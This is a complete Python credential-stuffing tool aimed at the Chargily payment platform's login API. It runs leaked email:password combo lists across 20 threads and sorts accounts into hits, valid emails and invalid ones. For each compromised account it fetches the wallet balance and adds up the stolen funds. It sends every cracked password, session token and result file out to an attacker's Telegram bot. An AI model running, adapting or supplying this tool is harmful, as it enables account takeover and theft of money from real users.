#!/usr/bin/env python3
import requests
import json
import time
import threading
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

# ======================= TELEGRAM CONFIG =======================
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "YOUR_CHAT_ID_HERE")
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

# ======================= CONFIG =======================
LOGIN_URL = "https://app2.chargily.net/api/v1/auth/login"
WALLET_URL = "https://app2.chargily.net/api/v1/user/wallet"
THREADS = 20
REQUEST_TIMEOUT = 15
DELAY_BETWEEN_REQUESTS = 0.5

OUTPUT_DIR = os.getenv("OUTPUT_DIR", "./output")
os.makedirs(OUTPUT_DIR, exist_ok=True)

GOOD_FILE = os.path.join(OUTPUT_DIR, "good.txt")
WALLET_FILE = os.path.join(OUTPUT_DIR, "wallets.txt")
VALID_EMAIL_FILE = os.path.join(OUTPUT_DIR, "valid_email.txt")
INVALID_FILE = os.path.join(OUTPUT_DIR, "invalid.txt")
ERROR_FILE = os.path.join(OUTPUT_DIR, "error.txt")

HEADERS = {
    "accept": "application/json",
    "content-type": "application/json",
    "origin": "https://app.chargily.com",
    "referer": "https://app.chargily.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
}

# ======================= ASCII ART =======================
ASCII_ART = r"""
██╗  ██╗ █████╗ ███╗   ███╗██╗███╗   ██╗
██║ ██╔╝██╔══██╗████╗ ████║██║████╗  ██║
█████╔╝ ███████║██╔████╔██║██║██╔██╗ ██║
██╔═██╗ ██╔══██║██║╚██╔╝██║██║██║╚██╗██║
██║  ██╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝"""

def rgb_print(text, r, g, b):
    print(f"\033[38;2;{r};{g};{b}m{text}\033[0m")

def rgb_bold_print(text, r, g, b):
    print(f"\033[1m\033[38;2;{r};{g};{b}m{text}\033[0m")

def print_banner():
    lines = ASCII_ART.split('\n')
    colors = [(0,255,0),(255,255,0),(255,0,0),(0,255,0),(200,0,255)]
    for i, line in enumerate(lines):
        r, g, b = colors[i % len(colors)]
        rgb_print(line, r, g, b)
    rgb_print("=" * 60, 255, 255, 255)
    rgb_bold_print("Chargily Checker (Multi-thread + Wallet + Telegram)", 200, 0, 255)
    rgb_print("=" * 60, 255, 255, 255)
    print()

# ======================= TELEGRAM FUNCTIONS =======================
def send_telegram(message, parse_mode="HTML"):
    """Send a message to the configured Telegram chat."""
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        return False
    try:
        url = f"{TELEGRAM_API}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True
        }
        r = requests.post(url, json=payload, timeout=10)
        return r.status_code == 200
    except Exception as e:
        print(f"[!] Telegram send error: {e}")
        return False

def send_telegram_document(filepath, caption=""):
    """Send a file to the configured Telegram chat."""
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        return False
    if not os.path.exists(filepath):
        return False
    try:
        url = f"{TELEGRAM_API}/sendDocument"
        with open(filepath, "rb") as f:
            files = {"document": f}
            data = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption}
            r = requests.post(url, files=files, data=data, timeout=30)
            return r.status_code == 200
    except Exception as e:
        print(f"[!] Telegram doc error: {e}")
        return False

# ======================= LOCKS =======================
file_lock = threading.Lock()
balance_lock = threading.Lock()
telegram_lock = threading.Lock()
total_wallet_balance_dzd = 0.0
total_wallet_balance_cc = 0.0

def safe_write(filepath, content):
    with file_lock:
        try:
            with open(filepath, "a", encoding="utf-8") as f:
                f.write(content + "\n")
        except Exception:
            pass

def load_combos(filepath):
    combos = []
    filepath = filepath.strip('"\' ')
    if not os.path.exists(filepath):
        print(Fore.RED + f"[!] File '{filepath}' not found.")
        return combos
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if ":" in line:
                    email, password = line.split(":", 1)
                    combos.append((email.strip(), password.strip()))
                else:
                    combos.append((line, "dummy_pass"))
    except Exception as e:
        print(Fore.RED + f"[!] Error reading combo file: {e}")
    return combos

def extract_balance(wallet_data):
    dzd = 0
    cc = 0
    for key in ["balance", "total_balance", "amount", "dzd"]:
        if key in wallet_data:
            try:
                dzd = float(wallet_data[key]); break
            except: pass
    for key in ["cc", "coins", "credit", "chargily_coins"]:
        if key in wallet_data:
            try:
                cc = float(wallet_data[key]); break
            except: pass
    return dzd, cc

# ======================= CORE =======================
def check_login(email, password):
    payload = {"email": email, "password": password}
    try:
        resp = requests.post(LOGIN_URL, json=payload, headers=HEADERS, timeout=REQUEST_TIMEOUT)
        try:
            data = resp.json()
        except:
            return "ERROR", {"message": f"Non-JSON: {resp.text[:100]}"}, None
        if resp.status_code in [200, 201]:
            token = None
            if "data" in data and isinstance(data["data"], dict):
                token = data["data"].get("access_token") or data["data"].get("token")
            if not token:
                token = data.get("access_token") or data.get("token")
            if token:
                return "GOOD", data, token
            return "ERROR", data, None
        msg = data.get("message", "") or data.get("error", "") or str(data)
        ml = msg.lower()
        if "does not match" in ml or "wrong password" in ml:
            return "VALID_EMAIL", data, None
        elif "user not found" in ml or "not registered" in ml:
            return "INVALID", data, None
        elif "too many attempts" in ml or "blocked" in ml:
            return "BLOCKED", {"message": msg}, None
        return "ERROR", {"message": msg}, None
    except requests.exceptions.Timeout:
        return "ERROR", {"message": "Timeout"}, None
    except requests.exceptions.ConnectionError:
        return "ERROR", {"message": "Connection Error"}, None
    except Exception as e:
        return "ERROR", {"message": str(e)}, None

def fetch_wallet(token):
    headers = HEADERS.copy()
    headers["authorization"] = f"Bearer {token}"
    try:
        resp = requests.get(WALLET_URL, headers=headers, timeout=REQUEST_TIMEOUT)
        if resp.status_code == 200:
            return resp.json()
        return {"error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"error": str(e)}

def process_account(email, password):
    global total_wallet_balance_dzd, total_wallet_balance_cc
    status, data, token = check_login(email, password)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if status == "GOOD":
        safe_write(GOOD_FILE, f"{email}:{password} | Token: {token}")
        wallet = fetch_wallet(token)
        wallet_line = f"[{timestamp}] {email} | Token: {token[:20]}...\n"
        wallet_line += f"Wallet: {json.dumps(wallet, ensure_ascii=False, indent=2)}"
        safe_write(WALLET_FILE, wallet_line)

        dzd, cc = extract_balance(wallet)
        operator = wallet.get("operator") or wallet.get("operator_name") or "N/A"

        with balance_lock:
            total_wallet_balance_dzd += dzd
            total_wallet_balance_cc += cc

        # Telegram notification for HIT
        tg_msg = (
            f"<b>✅ HIT FOUND</b>\n"
            f"<b>Email:</b> <code>{email}</code>\n"
            f"<b>Password:</b> <code>{password}</code>\n"
            f"<b>DZD:</b> {dzd}\n"
            f"<b>CC:</b> {cc}\n"
            f"<b>Operator:</b> {operator}\n"
            f"<b>Token:</b> <code>{token[:40]}...</code>"
        )
        with telegram_lock:
            send_telegram(tg_msg)

        if cc > 0:
            print(Fore.GREEN + f"[+] {email}:{password} | GOOD | DZD: {dzd} | CC: {cc} | Operator: {operator}")
        else:
            print(Fore.GREEN + f"[+] {email}:{password} | GOOD | DZD: {dzd} | Operator: {operator}")

    elif status == "VALID_EMAIL":
        safe_write(VALID_EMAIL_FILE, f"{email}:{password} | {data.get('message','')}")
        print(Fore.YELLOW + f"[!] {email}:{password} | VALID (wrong password)")
        with telegram_lock:
            send_telegram(f"<b>⚠️ VALID EMAIL</b>\n<code>{email}:{password}</code>\n<i>{data.get('message','')}</i>")

    elif status == "INVALID":
        safe_write(INVALID_FILE, f"{email}:{password} | {data.get('message','')}")
        print(Fore.RED + f"[-] {email}:{password} | INVALID (not registered)")

    elif status == "BLOCKED":
        safe_write(ERROR_FILE, f"{email}:{password} | BLOCKED: {data.get('message','')}")
        print(Fore.MAGENTA + f"[x] {email}:{password} | BLOCKED")
        with telegram_lock:
            send_telegram(f"<b>🚫 BLOCKED</b>\n<code>{email}:{password}</code>")

    else:
        safe_write(ERROR_FILE, f"{email}:{password} | ERROR: {data.get('message','')}")
        print(Fore.RED + f"[!] {email}:{password} | ERROR")

    time.sleep(DELAY_BETWEEN_REQUESTS)
    return status

# ======================= MAIN =======================
def main():
    global total_wallet_balance_dzd, total_wallet_balance_cc
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()

    print(Fore.CYAN + f"[+] Output Directory: {OUTPUT_DIR}")

    combo_path = None
    if len(sys.argv) > 1:
        combo_path = sys.argv[1]
    else:
        combo_path = os.getenv("COMBO_FILE", "").strip()
        if not combo_path:
            combo_path = input(Fore.YELLOW + "📁 Enter full path to combo file: " + Fore.CYAN).strip()

    if not combo_path:
        print(Fore.RED + "[!] No path provided. Exiting.")
        send_telegram("<b>❌ Checker failed:</b> No combo file provided.")
        return

    combos = load_combos(combo_path)
    if not combos:
        print(Fore.RED + "[!] No accounts loaded. Exiting.")
        send_telegram("<b>❌ Checker failed:</b> No accounts loaded.")
        return

    total = len(combos)
    print(Fore.CYAN + f"[+] Loaded: {total} accounts.")
    print(Fore.CYAN + f"[+] Threads: {THREADS}")
    print(Fore.YELLOW + "-" * 60)

    # Startup notification
    send_telegram(
        f"<b>🚀 CHARGILY CHECKER STARTED</b>\n"
        f"<b>Accounts:</b> {total}\n"
        f"<b>Threads:</b> {THREADS}\n"
        f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )

    processed = 0
    good_count = 0
    valid_count = 0
    bad_count = 0

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(process_account, e, p): (e, p) for e, p in combos}
        for future in as_completed(futures):
            status = future.result()
            processed += 1
            if status == "GOOD":
                good_count += 1
            elif status == "VALID_EMAIL":
                valid_count += 1
            else:
                bad_count += 1
            print(Fore.CYAN + f"[Progress] {processed}/{total} | Good: {good_count} | Valid: {valid_count} | Bad: {bad_count}", end="\r")

    print()
    print(Fore.YELLOW + "-" * 60)

    summary = (
        f"<b>🏁 CHECK FINISHED</b>\n"
        f"<b>✅ Good (Hits):</b> {good_count}\n"
        f"<b>⚠️ Valid (Wrong Pass):</b> {valid_count}\n"
        f"<b>❌ Bad:</b> {bad_count}\n"
        f"<b>💰 Total DZD:</b> {total_wallet_balance_dzd:.2f}\n"
        f"<b>💰 Total CC:</b> {total_wallet_balance_cc:.2f}"
    )
    send_telegram(summary)

    # Send result files
    for fp, cap in [
        (GOOD_FILE, "Good Hits"),
        (WALLET_FILE, "Wallets"),
        (VALID_EMAIL_FILE, "Valid Emails"),
        (INVALID_FILE, "Invalid"),
        (ERROR_FILE, "Errors"),
    ]:
        if os.path.exists(fp) and os.path.getsize(fp) > 0:
            send_telegram_document(fp, cap)

    print(Fore.GREEN + "\n🏁 CHECK FINISHED 🏁")
    print(Fore.CYAN + "=" * 50)
    print(Fore.GREEN + f"✅ Good (Hits): {good_count}")
    print(Fore.YELLOW + f"⚠️ Valid (Wrong Password): {valid_count}")
    print(Fore.RED + f"❌ Bad (Invalid / Errors): {bad_count}")
    print(Fore.CYAN + "-" * 50)
    print(Fore.MAGENTA + f"💰 Total DZD: {total_wallet_balance_dzd:.2f}")
    print(Fore.MAGENTA + f"💰 Total CC: {total_wallet_balance_cc:.2f}")
    print(Fore.CYAN + "-" * 50)
    print(Fore.GREEN + f"📁 Results saved in: {OUTPUT_DIR}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted by user.")
        send_telegram("<b>⚠️ Checker interrupted by user.</b>")
    except Exception as e:
        print(Fore.RED + f"[!] Unexpected Error: {e}")
        send_telegram(f"<b>❌ Fatal error:</b> <code>{e}</code>")
